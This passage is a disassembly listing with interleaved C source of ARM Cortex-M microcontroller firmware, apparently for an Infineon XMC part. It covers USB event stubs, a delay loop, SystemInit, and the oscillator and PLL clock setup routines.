 800621a:	f023 037f 	bic.w	r3, r3, #127	; 0x7f
 800621e:	b2da      	uxtb	r2, r3
 8006220:	4b04      	ldr	r3, [pc, #16]	; (8006234 <USB_DeviceTask+0x80>)
 8006222:	f883 213d 	strb.w	r2, [r3, #317]	; 0x13d
	}
 8006226:	e000      	b.n	800622a <USB_DeviceTask+0x76>
	  return;
 8006228:	bf00      	nop

	Endpoint_SelectEndpoint(PrevEndpoint);
}
 800622a:	3708      	adds	r7, #8
 800622c:	46bd      	mov	sp, r7
 800622e:	bd80      	pop	{r7, pc}
 8006230:	20000c9c 	.word	0x20000c9c
 8006234:	2000070c 	.word	0x2000070c

08006238 <USB_Event_Stub>:
#define  __INCLUDE_FROM_EVENTS_C
#define  __INCLUDE_FROM_USB_DRIVER
#include "Events.h"

void USB_Event_Stub(void)
{
 8006238:	b480      	push	{r7}
 800623a:	af00      	add	r7, sp, #0

}
 800623c:	bf00      	nop
 800623e:	46bd      	mov	sp, r7
 8006240:	f85d 7b04 	ldr.w	r7, [sp], #4
 8006244:	4770      	bx	lr

08006246 <delay>:

/*******************************************************************************
 * LOCAL FUNCTIONS
 *******************************************************************************/
static void delay(uint32_t cycles)
{
 8006246:	b480      	push	{r7}
 8006248:	b085      	sub	sp, #20
 800624a:	af00      	add	r7, sp, #0
 800624c:	6078      	str	r0, [r7, #4]
  volatile uint32_t i;

  for(i = 0UL; i < cycles ;++i)
 800624e:	2300      	movs	r3, #0
 8006250:	60fb      	str	r3, [r7, #12]
 8006252:	e003      	b.n	800625c <delay+0x16>
  {
    __NOP();
 8006254:	bf00      	nop
  for(i = 0UL; i < cycles ;++i)
 8006256:	68fb      	ldr	r3, [r7, #12]
 8006258:	3301      	adds	r3, #1
 800625a:	60fb      	str	r3, [r7, #12]
 800625c:	68fb      	ldr	r3, [r7, #12]
 800625e:	687a      	ldr	r2, [r7, #4]
 8006260:	429a      	cmp	r2, r3
 8006262:	d8f7      	bhi.n	8006254 <delay+0xe>
  }
}
 8006264:	bf00      	nop
 8006266:	bf00      	nop
 8006268:	3714      	adds	r7, #20
 800626a:	46bd      	mov	sp, r7
 800626c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8006270:	4770      	bx	lr
	...

08006274 <SystemInit>:
/*******************************************************************************
 * API IMPLEMENTATION
 *******************************************************************************/

__WEAK void SystemInit(void)
{
 8006274:	b598      	push	{r3, r4, r7, lr}
 8006276:	af00      	add	r7, sp, #0
  memcpy(g_chipid, CHIPID_LOC, 16);
 8006278:	4a06      	ldr	r2, [pc, #24]	; (8006294 <SystemInit+0x20>)
 800627a:	f04f 5300 	mov.w	r3, #536870912	; 0x20000000
 800627e:	4614      	mov	r4, r2
 8006280:	cb0f      	ldmia	r3, {r0, r1, r2, r3}
 8006282:	e884 000f 	stmia.w	r4, {r0, r1, r2, r3}

  SystemCoreSetup();
 8006286:	f000 f807 	bl	8006298 <SystemCoreSetup>
  SystemCoreClockSetup(); 
 800628a:	f7fa fb33 	bl	80008f4 <SystemCoreClockSetup>
}
 800628e:	bf00      	nop
 8006290:	bd98      	pop	{r3, r4, r7, pc}
 8006292:	bf00      	nop
 8006294:	2000ffc4 	.word	0x2000ffc4

08006298 <SystemCoreSetup>:

__WEAK void SystemCoreSetup(void)
{
 8006298:	b480      	push	{r7}
 800629a:	b083      	sub	sp, #12
 800629c:	af00      	add	r7, sp, #0
  __ASM volatile ("cpsid i" : : : "memory");
 800629e:	b672      	cpsid	i
}
 80062a0:	bf00      	nop
  uint32_t temp;
	
  /* relocate vector table */
  __disable_irq();
  SCB->VTOR = (uint32_t)(&__Vectors);
 80062a2:	4b17      	ldr	r3, [pc, #92]	; (8006300 <SystemCoreSetup+0x68>)
 80062a4:	4a17      	ldr	r2, [pc, #92]	; (8006304 <SystemCoreSetup+0x6c>)
 80062a6:	609a      	str	r2, [r3, #8]
  __ASM volatile ("dsb 0xF":::"memory");
 80062a8:	f3bf 8f4f 	dsb	sy
}
 80062ac:	bf00      	nop
  __ASM volatile ("cpsie i" : : : "memory");
 80062ae:	b662      	cpsie	i
}
 80062b0:	bf00      	nop
  __DSB();
  __enable_irq();
    
#if ((__FPU_PRESENT == 1) && (__FPU_USED == 1))
  SCB->CPACR |= ((3UL << 10*2) |                 /* set CP10 Full Access */
 80062b2:	4b13      	ldr	r3, [pc, #76]	; (8006300 <SystemCoreSetup+0x68>)
 80062b4:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 80062b8:	4a11      	ldr	r2, [pc, #68]	; (8006300 <SystemCoreSetup+0x68>)
 80062ba:	f443 0370 	orr.w	r3, r3, #15728640	; 0xf00000
 80062be:	f8c2 3088 	str.w	r3, [r2, #136]	; 0x88
                 (3UL << 11*2)  );               /* set CP11 Full Access */
#endif

  /* Enable unaligned memory access - SCB_CCR.UNALIGN_TRP = 0 */
  SCB->CCR &= ~(SCB_CCR_UNALIGN_TRP_Msk);
 80062c2:	4b0f      	ldr	r3, [pc, #60]	; (8006300 <SystemCoreSetup+0x68>)
 80062c4:	695b      	ldr	r3, [r3, #20]
 80062c6:	4a0e      	ldr	r2, [pc, #56]	; (8006300 <SystemCoreSetup+0x68>)
 80062c8:	f023 0308 	bic.w	r3, r3, #8
 80062cc:	6153      	str	r3, [r2, #20]

  temp = FLASH0->FCON;
 80062ce:	4b0e      	ldr	r3, [pc, #56]	; (8006308 <SystemCoreSetup+0x70>)
 80062d0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80062d4:	695b      	ldr	r3, [r3, #20]
 80062d6:	607b      	str	r3, [r7, #4]
  temp &= ~FLASH_FCON_WSPFLASH_Msk;
 80062d8:	687b      	ldr	r3, [r7, #4]
 80062da:	f023 030f 	bic.w	r3, r3, #15
 80062de:	607b      	str	r3, [r7, #4]
  temp |= PMU_FLASH_WS;
 80062e0:	687b      	ldr	r3, [r7, #4]
 80062e2:	f043 0303 	orr.w	r3, r3, #3
 80062e6:	607b      	str	r3, [r7, #4]
  FLASH0->FCON = temp;
 80062e8:	4b07      	ldr	r3, [pc, #28]	; (8006308 <SystemCoreSetup+0x70>)
 80062ea:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80062ee:	461a      	mov	r2, r3
 80062f0:	687b      	ldr	r3, [r7, #4]
 80062f2:	6153      	str	r3, [r2, #20]
}
 80062f4:	bf00      	nop
 80062f6:	370c      	adds	r7, #12
 80062f8:	46bd      	mov	sp, r7
 80062fa:	f85d 7b04 	ldr.w	r7, [sp], #4
 80062fe:	4770      	bx	lr
 8006300:	e000ed00 	.word	0xe000ed00
 8006304:	08000000 	.word	0x08000000
 8006308:	58001000 	.word	0x58001000

__WEAK void SystemCoreClockSetup(void)
{
 800630c:	b580      	push	{r7, lr}
 800630e:	af00      	add	r7, sp, #0
#else
  /* Automatic calibration uses the fSTDBY */

  /* Enable HIB domain */
  /* Power up HIB domain if and only if it is currently powered down */
  if((SCU_POWER->PWRSTAT & SCU_POWER_PWRSTAT_HIBEN_Msk) == 0)
 8006310:	4b75      	ldr	r3, [pc, #468]	; (80064e8 <SystemCoreSetup+0x250>)
 8006312:	681b      	ldr	r3, [r3, #0]
 8006314:	f003 0301 	and.w	r3, r3, #1
 8006318:	2b00      	cmp	r3, #0
 800631a:	d10c      	bne.n	8006336 <SystemCoreSetup+0x9e>
  {
    SCU_POWER->PWRSET |= SCU_POWER_PWRSET_HIB_Msk;
 800631c:	4b72      	ldr	r3, [pc, #456]	; (80064e8 <SystemCoreSetup+0x250>)
 800631e:	685b      	ldr	r3, [r3, #4]
 8006320:	4a71      	ldr	r2, [pc, #452]	; (80064e8 <SystemCoreSetup+0x250>)
 8006322:	f043 0301 	orr.w	r3, r3, #1
 8006326:	6053      	str	r3, [r2, #4]

    while((SCU_POWER->PWRSTAT & SCU_POWER_PWRSTAT_HIBEN_Msk) == 0)
 8006328:	bf00      	nop
 800632a:	4b6f      	ldr	r3, [pc, #444]	; (80064e8 <SystemCoreSetup+0x250>)
 800632c:	681b      	ldr	r3, [r3, #0]
 800632e:	f003 0301 	and.w	r3, r3, #1
 8006332:	2b00      	cmp	r3, #0
 8006334:	d0f9      	beq.n	800632a <SystemCoreSetup+0x92>
      /* wait until HIB domain is enabled */
    }
  }

  /* Remove the reset only if HIB domain were in a state of reset */
  if((SCU_RESET->RSTSTAT) & SCU_RESET_RSTSTAT_HIBRS_Msk)
 8006336:	4b6d      	ldr	r3, [pc, #436]	; (80064ec <SystemCoreSetup+0x254>)
 8006338:	681b      	ldr	r3, [r3, #0]
 800633a:	f403 7300 	and.w	r3, r3, #512	; 0x200
 800633e:	2b00      	cmp	r3, #0
 8006340:	d009      	beq.n	8006356 <SystemCoreSetup+0xbe>
  {
    SCU_RESET->RSTCLR |= SCU_RESET_RSTCLR_HIBRS_Msk;
 8006342:	4b6a      	ldr	r3, [pc, #424]	; (80064ec <SystemCoreSetup+0x254>)
 8006344:	689b      	ldr	r3, [r3, #8]
 8006346:	4a69      	ldr	r2, [pc, #420]	; (80064ec <SystemCoreSetup+0x254>)
 8006348:	f443 7300 	orr.w	r3, r3, #512	; 0x200
 800634c:	6093      	str	r3, [r2, #8]
    delay(DELAY_CNT_150US_50MHZ);
 800634e:	f641 504c 	movw	r0, #7500	; 0x1d4c
 8006352:	f7ff ff78 	bl	8006246 <delay>
  SCU_HIBERNATE->HDCR |= SCU_HIBERNATE_HDCR_RCS_Msk | SCU_HIBERNATE_HDCR_STDBYSEL_Msk;

#endif /* STDBY_CLOCK_SRC == STDBY_CLOCK_SRC_OSCULP */

  /* Enable automatic calibration of internal fast oscillator */
  SCU_PLL->PLLCON0 |= SCU_PLL_PLLCON0_AOTREN_Msk;
 8006356:	4b66      	ldr	r3, [pc, #408]	; (80064f0 <SystemCoreSetup+0x258>)
 8006358:	685b      	ldr	r3, [r3, #4]
 800635a:	4a65      	ldr	r2, [pc, #404]	; (80064f0 <SystemCoreSetup+0x258>)
 800635c:	f443 2300 	orr.w	r3, r3, #524288	; 0x80000
 8006360:	6053      	str	r3, [r2, #4]
#endif /* FOFI_CALIBRATION_MODE == FOFI_CALIBRATION_MODE_AUTOMATIC */

  delay(DELAY_CNT_50US_50MHZ);
 8006362:	f640 10c4 	movw	r0, #2500	; 0x9c4
 8006366:	f7ff ff6e 	bl	8006246 <delay>

#if ENABLE_PLL

  /* enable PLL */
  SCU_PLL->PLLCON0 &= ~(SCU_PLL_PLLCON0_VCOPWD_Msk | SCU_PLL_PLLCON0_PLLPWD_Msk);
 800636a:	4b61      	ldr	r3, [pc, #388]	; (80064f0 <SystemCoreSetup+0x258>)
 800636c:	685b      	ldr	r3, [r3, #4]
 800636e:	4a60      	ldr	r2, [pc, #384]	; (80064f0 <SystemCoreSetup+0x258>)
 8006370:	f423 3380 	bic.w	r3, r3, #65536	; 0x10000
 8006374:	f023 0302 	bic.w	r3, r3, #2
 8006378:	6053      	str	r3, [r2, #4]

#if PLL_CLOCK_SRC != PLL_CLOCK_SRC_OFI
  /* enable OSC_HP */
  if ((SCU_OSC->OSCHPCTRL & SCU_OSC_OSCHPCTRL_MODE_Msk) != 0U)
 800637a:	4b5e      	ldr	r3, [pc, #376]	; (80064f4 <SystemCoreSetup+0x25c>)
 800637c:	685b      	ldr	r3, [r3, #4]
 800637e:	f003 0330 	and.w	r3, r3, #48	; 0x30
 8006382:	2b00      	cmp	r3, #0
 8006384:	d029      	beq.n	80063da <SystemCoreSetup+0x142>
  {
    SCU_OSC->OSCHPCTRL &= ~(SCU_OSC_OSCHPCTRL_MODE_Msk | SCU_OSC_OSCHPCTRL_OSCVAL_Msk);
 8006386:	4b5b      	ldr	r3, [pc, #364]	; (80064f4 <SystemCoreSetup+0x25c>)
 8006388:	685b      	ldr	r3, [r3, #4]
 800638a:	4a5a      	ldr	r2, [pc, #360]	; (80064f4 <SystemCoreSetup+0x25c>)
 800638c:	f423 2370 	bic.w	r3, r3, #983040	; 0xf0000
 8006390:	f023 0330 	bic.w	r3, r3, #48	; 0x30
 8006394:	6053      	str	r3, [r2, #4]
    SCU_OSC->OSCHPCTRL |= ((OSCHP_GetFrequency() / FOSCREF) - 1UL) << SCU_OSC_OSCHPCTRL_OSCVAL_Pos;
 8006396:	f000 f927 	bl	80065e8 <OSCHP_GetFrequency>
 800639a:	4603      	mov	r3, r0
 800639c:	4a56      	ldr	r2, [pc, #344]	; (80064f8 <SystemCoreSetup+0x260>)
 800639e:	fba2 2303 	umull	r2, r3, r2, r3
 80063a2:	0d1b      	lsrs	r3, r3, #20
 80063a4:	3b01      	subs	r3, #1
 80063a6:	041a      	lsls	r2, r3, #16
 80063a8:	4b52      	ldr	r3, [pc, #328]	; (80064f4 <SystemCoreSetup+0x25c>)
 80063aa:	685b      	ldr	r3, [r3, #4]
 80063ac:	4951      	ldr	r1, [pc, #324]	; (80064f4 <SystemCoreSetup+0x25c>)
 80063ae:	4313      	orrs	r3, r2
 80063b0:	604b      	str	r3, [r1, #4]

    /* select OSC_HP clock as PLL input */
    SCU_PLL->PLLCON2 &= ~SCU_PLL_PLLCON2_PINSEL_Msk;
 80063b2:	4b4f      	ldr	r3, [pc, #316]	; (80064f0 <SystemCoreSetup+0x258>)
 80063b4:	68db      	ldr	r3, [r3, #12]
 80063b6:	4a4e      	ldr	r2, [pc, #312]	; (80064f0 <SystemCoreSetup+0x258>)
 80063b8:	f023 0301 	bic.w	r3, r3, #1
 80063bc:	60d3      	str	r3, [r2, #12]

    /* restart OSC Watchdog */
    SCU_PLL->PLLCON0 &= ~SCU_PLL_PLLCON0_OSCRES_Msk;
 80063be:	4b4c      	ldr	r3, [pc, #304]	; (80064f0 <SystemCoreSetup+0x258>)
 80063c0:	685b      	ldr	r3, [r3, #4]
 80063c2:	4a4b      	ldr	r2, [pc, #300]	; (80064f0 <SystemCoreSetup+0x258>)
 80063c4:	f423 3300 	bic.w	r3, r3, #131072	; 0x20000
 80063c8:	6053      	str	r3, [r2, #4]

    while ((SCU_PLL->PLLSTAT & SCU_PLL_PLLSTAT_OSC_USABLE) != SCU_PLL_PLLSTAT_OSC_USABLE)
 80063ca:	bf00      	nop
 80063cc:	4b48      	ldr	r3, [pc, #288]	; (80064f0 <SystemCoreSetup+0x258>)
 80063ce:	681b      	ldr	r3, [r3, #0]
 80063d0:	f403 7360 	and.w	r3, r3, #896	; 0x380
 80063d4:	f5b3 7f60 	cmp.w	r3, #896	; 0x380
 80063d8:	d1f8      	bne.n	80063cc <SystemCoreSetup+0x134>
  /* select backup clock as PLL input */
  SCU_PLL->PLLCON2 |= SCU_PLL_PLLCON2_PINSEL_Msk;
#endif

  /* Go to bypass the Main PLL */
  SCU_PLL->PLLCON0 |= SCU_PLL_PLLCON0_VCOBYP_Msk;
 80063da:	4b45      	ldr	r3, [pc, #276]	; (80064f0 <SystemCoreSetup+0x258>)
 80063dc:	685b      	ldr	r3, [r3, #4]
 80063de:	4a44      	ldr	r2, [pc, #272]	; (80064f0 <SystemCoreSetup+0x258>)
 80063e0:	f043 0301 	orr.w	r3, r3, #1
 80063e4:	6053      	str	r3, [r2, #4]

  /* disconnect Oscillator from PLL */
  SCU_PLL->PLLCON0 |= SCU_PLL_PLLCON0_FINDIS_Msk;
 80063e6:	4b42      	ldr	r3, [pc, #264]	; (80064f0 <SystemCoreSetup+0x258>)
 80063e8:	685b      	ldr	r3, [r3, #4]
 80063ea:	4a41      	ldr	r2, [pc, #260]	; (80064f0 <SystemCoreSetup+0x258>)
 80063ec:	f043 0310 	orr.w	r3, r3, #16
 80063f0:	6053      	str	r3, [r2, #4]

  /* Setup divider settings for main PLL */
  SCU_PLL->PLLCON1 = ((PLL_NDIV << SCU_PLL_PLLCON1_NDIV_Pos) |
 80063f2:	4b3f      	ldr	r3, [pc, #252]	; (80064f0 <SystemCoreSetup+0x258>)
 80063f4:	4a41      	ldr	r2, [pc, #260]	; (80064fc <SystemCoreSetup+0x264>)
 80063f6:	609a      	str	r2, [r3, #8]
                      (PLL_K2DIV_0 << SCU_PLL_PLLCON1_K2DIV_Pos) |
                      (PLL_PDIV << SCU_PLL_PLLCON1_PDIV_Pos));

  /* Set OSCDISCDIS */
  SCU_PLL->PLLCON0 |= SCU_PLL_PLLCON0_OSCDISCDIS_Msk;
 80063f8:	4b3d      	ldr	r3, [pc, #244]	; (80064f0 <SystemCoreSetup+0x258>)
 80063fa:	685b      	ldr	r3, [r3, #4]
 80063fc:	4a3c      	ldr	r2, [pc, #240]	; (80064f0 <SystemCoreSetup+0x258>)
 80063fe:	f043 0340 	orr.w	r3, r3, #64	; 0x40
 8006402:	6053      	str	r3, [r2, #4]

  /* connect Oscillator to PLL */
  SCU_PLL->PLLCON0 &= ~SCU_PLL_PLLCON0_FINDIS_Msk;
 8006404:	4b3a      	ldr	r3, [pc, #232]	; (80064f0 <SystemCoreSetup+0x258>)
 8006406:	685b      	ldr	r3, [r3, #4]
 8006408:	4a39      	ldr	r2, [pc, #228]	; (80064f0 <SystemCoreSetup+0x258>)
 800640a:	f023 0310 	bic.w	r3, r3, #16
 800640e:	6053      	str	r3, [r2, #4]

  /* restart PLL Lock detection */
  SCU_PLL->PLLCON0 |= SCU_PLL_PLLCON0_RESLD_Msk;
 8006410:	4b37      	ldr	r3, [pc, #220]	; (80064f0 <SystemCoreSetup+0x258>)
 8006412:	685b      	ldr	r3, [r3, #4]
 8006414:	4a36      	ldr	r2, [pc, #216]	; (80064f0 <SystemCoreSetup+0x258>)
 8006416:	f443 2380 	orr.w	r3, r3, #262144	; 0x40000
 800641a:	6053      	str	r3, [r2, #4]

  while ((SCU_PLL->PLLSTAT & SCU_PLL_PLLSTAT_VCOLOCK_Msk) == 0U)
 800641c:	bf00      	nop
 800641e:	4b34      	ldr	r3, [pc, #208]	; (80064f0 <SystemCoreSetup+0x258>)
 8006420:	681b      	ldr	r3, [r3, #0]
 8006422:	f003 0304 	and.w	r3, r3, #4
 8006426:	2b00      	cmp	r3, #0
 8006428:	d0f9      	beq.n	800641e <SystemCoreSetup+0x186>
  {
    /* wait for PLL Lock */
  }

  /* Disable bypass- put PLL clock back */
  SCU_PLL->PLLCON0 &= ~SCU_PLL_PLLCON0_VCOBYP_Msk;
 800642a:	4b31      	ldr	r3, [pc, #196]	; (80064f0 <SystemCoreSetup+0x258>)
 800642c:	685b      	ldr	r3, [r3, #4]
 800642e:	4a30      	ldr	r2, [pc, #192]	; (80064f0 <SystemCoreSetup+0x258>)
 8006430:	f023 0301 	bic.w	r3, r3, #1
 8006434:	6053      	str	r3, [r2, #4]
  while ((SCU_PLL->PLLSTAT & SCU_PLL_PLLSTAT_VCOBYST_Msk) != 0U)
 8006436:	bf00      	nop
 8006438:	4b2d      	ldr	r3, [pc, #180]	; (80064f0 <SystemCoreSetup+0x258>)
 800643a:	681b      	ldr	r3, [r3, #0]
 800643c:	f003 0301 	and.w	r3, r3, #1
 8006440:	2b00      	cmp	r3, #0
 8006442:	d1f9      	bne.n	8006438 <SystemCoreSetup+0x1a0>
  }
#endif /* ENABLE_PLL */

#if (SYS_CLOCK_SRC == SYS_CLOCK_SRC_PLL)
  /* Switch system clock to PLL */
  SCU_CLK->SYSCLKCR |= SCU_CLK_SYSCLKCR_SYSSEL_Msk;
 8006444:	4b2e      	ldr	r3, [pc, #184]	; (8006500 <SystemCoreSetup+0x268>)
 8006446:	68db      	ldr	r3, [r3, #12]
 8006448:	4a2d      	ldr	r2, [pc, #180]	; (8006500 <SystemCoreSetup+0x268>)
 800644a:	f443 3380 	orr.w	r3, r3, #65536	; 0x10000
 800644e:	60d3      	str	r3, [r2, #12]
  /* Switch system clock to backup clock */
  SCU_CLK->SYSCLKCR &= ~SCU_CLK_SYSCLKCR_SYSSEL_Msk;
#endif

  /* Before scaling to final frequency we need to setup the clock dividers */
  SCU_CLK->PBCLKCR = PBCLKDIV;
 8006450:	4b2b      	ldr	r3, [pc, #172]	; (8006500 <SystemCoreSetup+0x268>)
 8006452:	2200      	movs	r2, #0
 8006454:	615a      	str	r2, [r3, #20]
  SCU_CLK->CPUCLKCR = CPUCLKDIV;
 8006456:	4b2a      	ldr	r3, [pc, #168]	; (8006500 <SystemCoreSetup+0x268>)
 8006458:	2200      	movs	r2, #0
 800645a:	611a      	str	r2, [r3, #16]
  SCU_CLK->CCUCLKCR = CCUCLKDIV;
 800645c:	4b28      	ldr	r3, [pc, #160]	; (8006500 <SystemCoreSetup+0x268>)
 800645e:	2200      	movs	r2, #0
 8006460:	621a      	str	r2, [r3, #32]
  SCU_CLK->WDTCLKCR = WDTCLKDIV;
 8006462:	4b27      	ldr	r3, [pc, #156]	; (8006500 <SystemCoreSetup+0x268>)
 8006464:	2200      	movs	r2, #0
 8006466:	625a      	str	r2, [r3, #36]	; 0x24
  SCU_CLK->EBUCLKCR = EBUCLKDIV;
 8006468:	4b25      	ldr	r3, [pc, #148]	; (8006500 <SystemCoreSetup+0x268>)
 800646a:	2200      	movs	r2, #0
 800646c:	61da      	str	r2, [r3, #28]
  SCU_CLK->USBCLKCR = USBCLKDIV;
 800646e:	4b24      	ldr	r3, [pc, #144]	; (8006500 <SystemCoreSetup+0x268>)
 8006470:	2203      	movs	r2, #3
 8006472:	619a      	str	r2, [r3, #24]

#if ENABLE_PLL
  /* PLL frequency stepping...*/
  /* Reset OSCDISCDIS */
  SCU_PLL->PLLCON0 &= ~SCU_PLL_PLLCON0_OSCDISCDIS_Msk;
 8006474:	4b1e      	ldr	r3, [pc, #120]	; (80064f0 <SystemCoreSetup+0x258>)
 8006476:	685b      	ldr	r3, [r3, #4]
 8006478:	4a1d      	ldr	r2, [pc, #116]	; (80064f0 <SystemCoreSetup+0x258>)
 800647a:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 800647e:	6053      	str	r3, [r2, #4]

  SCU_PLL->PLLCON1 = ((PLL_NDIV << SCU_PLL_PLLCON1_NDIV_Pos) |
 8006480:	4b1b      	ldr	r3, [pc, #108]	; (80064f0 <SystemCoreSetup+0x258>)
 8006482:	4a20      	ldr	r2, [pc, #128]	; (8006504 <SystemCoreSetup+0x26c>)
 8006484:	609a      	str	r2, [r3, #8]
	                    (PLL_K2DIV_1 << SCU_PLL_PLLCON1_K2DIV_Pos) |
	                    (PLL_PDIV << SCU_PLL_PLLCON1_PDIV_Pos));


  delay(DELAY_CNT_50US_60MHZ);
 8006486:	f640 30b8 	movw	r0, #3000	; 0xbb8
 800648a:	f7ff fedc 	bl	8006246 <delay>
  while ((SCU_PLL->PLLSTAT & SCU_PLL_PLLSTAT_VCOLOCK_Msk) == 0U)
 800648e:	bf00      	nop
 8006490:	4b17      	ldr	r3, [pc, #92]	; (80064f0 <SystemCoreSetup+0x258>)
 8006492:	681b      	ldr	r3, [r3, #0]
 8006494:	f003 0304 	and.w	r3, r3, #4
 8006498:	2b00      	cmp	r3, #0
 800649a:	d0f9      	beq.n	8006490 <SystemCoreSetup+0x1f8>
  {
    /* wait for PLL Lock */
  }

  SCU_PLL->PLLCON1 = ((PLL_NDIV << SCU_PLL_PLLCON1_NDIV_Pos) |
 800649c:	4b14      	ldr	r3, [pc, #80]	; (80064f0 <SystemCoreSetup+0x258>)
 800649e:	4a1a      	ldr	r2, [pc, #104]	; (8006508 <SystemCoreSetup+0x270>)
 80064a0:	609a      	str	r2, [r3, #8]
	                    (PLL_K2DIV_2 << SCU_PLL_PLLCON1_K2DIV_Pos) |
	                    (PLL_PDIV << SCU_PLL_PLLCON1_PDIV_Pos));


  delay(DELAY_CNT_50US_90MHZ);
 80064a2:	f241 1094 	movw	r0, #4500	; 0x1194
 80064a6:	f7ff fece 	bl	8006246 <delay>
  while ((SCU_PLL->PLLSTAT & SCU_PLL_PLLSTAT_VCOLOCK_Msk) == 0U)
 80064aa:	bf00      	nop
 80064ac:	4b10      	ldr	r3, [pc, #64]	; (80064f0 <SystemCoreSetup+0x258>)
 80064ae:	681b      	ldr	r3, [r3, #0]
 80064b0:	f003 0304 	and.w	r3, r3, #4
 80064b4:	2b00      	cmp	r3, #0
 80064b6:	d0f9      	beq.n	80064ac <SystemCoreSetup+0x214>
  {
    /* wait for PLL Lock */
  }

  SCU_PLL->PLLCON1 = ((PLL_NDIV << SCU_PLL_PLLCON1_NDIV_Pos) |
 80064b8:	4b0d      	ldr	r3, [pc, #52]	; (80064f0 <SystemCoreSetup+0x258>)
 80064ba:	4a14      	ldr	r2, [pc, #80]	; (800650c <SystemCoreSetup+0x274>)
 80064bc:	609a      	str	r2, [r3, #8]
	                    (PLL_K2DIV << SCU_PLL_PLLCON1_K2DIV_Pos) |
	                    (PLL_PDIV << SCU_PLL_PLLCON1_PDIV_Pos));


  delay(DELAY_CNT_50US_120MHZ);
 80064be:	f241 7070 	movw	r0, #6000	; 0x1770
 80064c2:	f7ff fec0 	bl	8006246 <delay>
  while ((SCU_PLL->PLLSTAT & SCU_PLL_PLLSTAT_VCOLOCK_Msk) == 0U)
 80064c6:	bf00      	nop
 80064c8:	4b09      	ldr	r3, [pc, #36]	; (80064f0 <SystemCoreSetup+0x258>)
 80064ca:	681b      	ldr	r3, [r3, #0]
 80064cc:	f003 0304 	and.w	r3, r3, #4
 80064d0:	2b00      	cmp	r3, #0
 80064d2:	d0f9      	beq.n	80064c8 <SystemCoreSetup+0x230>
  {
    /* wait for PLL Lock */
  }

  SCU_TRAP->TRAPCLR = SCU_TRAP_TRAPCLR_SOSCWDGT_Msk | SCU_TRAP_TRAPCLR_SVCOLCKT_Msk;
 80064d4:	4b0e      	ldr	r3, [pc, #56]	; (8006510 <SystemCoreSetup+0x278>)
 80064d6:	2205      	movs	r2, #5
 80064d8:	60da      	str	r2, [r3, #12]
    /* wait for PLL Lock */
  }
#endif /* (USBCLKDIV & SCU_CLK_USBCLKCR_USBSEL_Msk) */

  /* Enable selected clocks */
  SCU_CLK->CLKSET = ENABLE_SCUCLK;
 80064da:	4b09      	ldr	r3, [pc, #36]	; (8006500 <SystemCoreSetup+0x268>)
 80064dc:	2200      	movs	r2, #0
 80064de:	605a      	str	r2, [r3, #4]
  PORT0->IOCR8 = (PORT0->IOCR8 & ~PORT0_IOCR8_PC8_Msk) | (0x11U << PORT0_IOCR8_PC8_Pos);
#endif

#endif  /* ENABLE_EXTCLK == 1  */

  SystemCoreClockUpdate();
 80064e0:	f000 f818 	bl	8006514 <SystemCoreClockUpdate>
}
 80064e4:	bf00      	nop
 80064e6:	bd80      	pop	{r7, pc}
 80064e8:	50004200 	.word	0x50004200
 80064ec:	50004400 	.word	0x50004400
 80064f0:	50004710 	.word	0x50004710
 80064f4:	50004700 	.word	0x50004700
 80064f8:	6b5fca6b 	.word	0x6b5fca6b
 80064fc:	01134f00 	.word	0x01134f00
 8006500:	50004600 	.word	0x50004600
 8006504:	01074f00 	.word	0x01074f00
 8006508:	01044f00 	.word	0x01044f00
 800650c:	01034f00 	.word	0x01034f00
 8006510:	50004160 	.word	0x50004160

08006514 <SystemCoreClockUpdate>:

__WEAK void SystemCoreClockUpdate(void)
{
 8006514:	b580      	push	{r7, lr}
 8006516:	b084      	sub	sp, #16
 8006518:	af00      	add	r7, sp, #0
  uint32_t pdiv;
  uint32_t ndiv;
  uint32_t kdiv;
  uint32_t temp;

  if (SCU_CLK->SYSCLKCR & SCU_CLK_SYSCLKCR_SYSSEL_Msk)
 800651a:	4b2f      	ldr	r3, [pc, #188]	; (80065d8 <SystemCoreClockUpdate+0xc4>)
 800651c:	68db      	ldr	r3, [r3, #12]
 800651e:	f403 3380 	and.w	r3, r3, #65536	; 0x10000
 8006522:	2b00      	cmp	r3, #0
 8006524:	d03e      	beq.n	80065a4 <SystemCoreClockUpdate+0x90>
  {
    /* fPLL is clock source for fSYS */
    if(SCU_PLL->PLLCON2 & SCU_PLL_PLLCON2_PINSEL_Msk)
 8006526:	4b2d      	ldr	r3, [pc, #180]	; (80065dc <SystemCoreClockUpdate+0xc8>)
 8006528:	68db      	ldr	r3, [r3, #12]
 800652a:	f003 0301 	and.w	r3, r3, #1
 800652e:	2b00      	cmp	r3, #0
 8006530:	d002      	beq.n	8006538 <SystemCoreClockUpdate+0x24>
    {
      /* PLL input clock is the backup clock (fOFI) */
      temp = OFI_FREQUENCY;
 8006532:	4b2b      	ldr	r3, [pc, #172]	; (80065e0 <SystemCoreClockUpdate+0xcc>)
 8006534:	60fb      	str	r3, [r7, #12]
 8006536:	e002      	b.n	800653e <SystemCoreClockUpdate+0x2a>
    }
    else
    {
      /* PLL input clock is the high performance osicllator (fOSCHP) */
      temp = OSCHP_GetFrequency();
 8006538:	f000 f856 	bl	80065e8 <OSCHP_GetFrequency>
 800653c:	60f8      	str	r0, [r7, #12]
    }

    /* check if PLL is locked */
    if (SCU_PLL->PLLSTAT & SCU_PLL_PLLSTAT_VCOLOCK_Msk)
 800653e:	4b27      	ldr	r3, [pc, #156]	; (80065dc <SystemCoreClockUpdate+0xc8>)
 8006540:	681b      	ldr	r3, [r3, #0]
 8006542:	f003 0304 	and.w	r3, r3, #4
 8006546:	2b00      	cmp	r3, #0
 8006548:	d020      	beq.n	800658c <SystemCoreClockUpdate+0x78>
    {
      /* PLL normal mode */
      /* read back divider settings */
      pdiv = ((SCU_PLL->PLLCON1 & SCU_PLL_PLLCON1_PDIV_Msk) >> SCU_PLL_PLLCON1_PDIV_Pos) + 1;
 800654a:	4b24      	ldr	r3, [pc, #144]	; (80065dc <SystemCoreClockUpdate+0xc8>)
 800654c:	689b      	ldr	r3, [r3, #8]
 800654e:	0e1b      	lsrs	r3, r3, #24
 8006550:	f003 030f 	and.w	r3, r3, #15
 8006554:	3301      	adds	r3, #1
 8006556:	607b      	str	r3, [r7, #4]
